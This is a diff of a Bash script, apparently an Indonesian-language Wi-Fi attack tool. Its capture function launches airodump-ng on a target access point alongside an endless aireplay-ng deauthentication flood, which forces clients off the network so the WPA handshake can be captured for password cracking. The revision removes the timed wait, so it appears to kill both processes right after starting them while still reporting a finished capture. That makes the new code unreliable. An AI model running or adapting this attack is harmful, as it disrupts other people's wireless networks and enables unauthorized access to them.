@@ -194,7 +194,7 @@ function pilih_interface(){
         read -p "[#] Pilih nomor interface yang ingin digunakan (1-${#daftar_interface[@]}): " nomor_pilih
         # Validasi input harus angka
         if ! [[ "${nomor_pilih}" =~ ^[0-9]+$ ]]; then
-            echo "[-] Masukkan harus berupa angka."
+            echo "[-] Masukkan harus berupa angka. Silahkan pilih lagi."
             continue
         fi
         # Validasi nomor berada dalam rentang yang valid
@@ -340,11 +340,25 @@ function capture_handshake(){
 
         echo "[*] Mencapture handshake untuk ESSID '${essid_target}'..."
         sleep 3
+
         xterm -geometry 100x20+0+0 -e airodump-ng --bssid "${bssid_target}" --channel "${channel_target}" --write "${path_capture}" "${pilih_interface}" &
+        airodump_pid=$!
+
         sleep 2
+
         xterm -geometry 100x20+0+300 -e aireplay-ng -0 0 -a "${bssid_target}" "${pilih_interface}" &
-        sleep "${lama_waktu}"
-        pkill -P $$ xterm
+        aireplay_pid=$!
+
+        if ps -p $airodump_pid > /dev/null 2>&1; then
+                kill $airodump_pid 2>/dev/null
+        fi
+
+        if ps -p $aireplay_pid > /dev/null 2>&1; then
+                kill $aireplay_pid 2>/dev/null
+        fi
+
+        pkill -P $$ xterm 2>/dev/null
+
         echo "[*] Proses capture handshake selesai."
         echo "[+] File capture disimpan di: '${path_capture}-01.cap'"
 }
